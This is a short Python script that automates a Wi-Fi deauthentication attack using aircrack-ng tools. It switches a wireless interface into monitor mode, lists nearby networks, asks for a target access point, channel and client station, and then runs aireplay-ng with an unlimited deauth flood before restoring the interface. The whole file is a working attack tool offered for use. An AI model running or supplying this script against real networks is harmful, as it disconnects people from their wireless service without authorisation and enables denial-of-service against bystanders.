import os
import subprocess
import asyncio
import pyrcrack

from get_nic import getnic
from rich.console import Console
from rich.prompt import Prompt

def cleaning(selected_interface):
    print(f'\nCleaning ---------------------------------')
    print(f'Setting interface to managed mode')
    os.system(f'airmon-ng check kill')
    os.system(f'sudo airmon-ng stop {selected_interface}')
    os.system(f'sudo service NetworkManager restart')
    print(f'\nCleaning ended ---------------------------------')

def set_monitor_mode(selected_interface):
    print(f'preparing interface -------------------------')
    # kill conlicting networks methods 
    os.system(f'airmon-ng check kill')
    # stop the interface
    os.system(f'sudo airmon-ng stop {selected_interface}')
    # put selected interface to monitor mode
    os.system(f'sudo airmon-ng start {selected_interface}')
    print(f'Interface changed to monitor mode')
    print(f'interface prepared -------------------------')

def monitor_selected_network(selected_interface, selected_network, selected_channel):
    # call the function to monitor selected network
    subprocess.call(['xterm', '-e', f'sudo airodump-ng --band a -c {selected_channel} --bssid {selected_network} {selected_interface}'])

def deauth(selected_interface, target_network_bssid, target_station_bssid):
    # call the function to monitor selected network
    subprocess.call(['xterm', '-e', f'sudo aireplay-ng -0 0 -a {target_network_bssid} -c {target_station_bssid} {selected_interface}'])
    print(f'Attack finished successfully')
    print(f'Atatack finished -------------------------')

# preparing
console = Console()
console.clear()

# get avalible interfaces
print("Getting avaliable interfaces\n")
interfaces = getnic.interfaces()

for index, interface in enumerate(interfaces):
    print(f'{index}: Interface {interface}')

# user select the interface
print('\nSelect your interface')
selected_interface_index = int(input())

# select the interface and change to monitor mode
selected_interface = interfaces[selected_interface_index]
print(f'\nSelected interface {selected_interface}')

# set internface to monitor mode
set_monitor_mode(selected_interface)

# call the function to see avalible networks
subprocess.call(['xterm', '-e', f'sudo airodump-ng --band a {selected_interface}'])

# user select the network and channel to attack
# select channel
print('\nSelect the network to attack (BSSID)')
network_to_attack = input()
print(f'\nSelected network to attack {network_to_attack}')
# select the channel
print('\nSelect the channel (CH) of the network to attack')
channel_of_network_to_attack = int(input())
print(f'\nSelected channel of the network to attack {channel_of_network_to_attack}')

# monitor the selected network
monitor_selected_network(selected_interface, network_to_attack, channel_of_network_to_attack)

# user select the target
print('\nSelect the target station (BSSID)')
target_bssid = input()

# do the deauth attack
deauth(selected_interface, network_to_attack, target_bssid)

# closing so clean everything
cleaning(selected_interface)

subprocess.call(['xterm', '-e', 'ls'])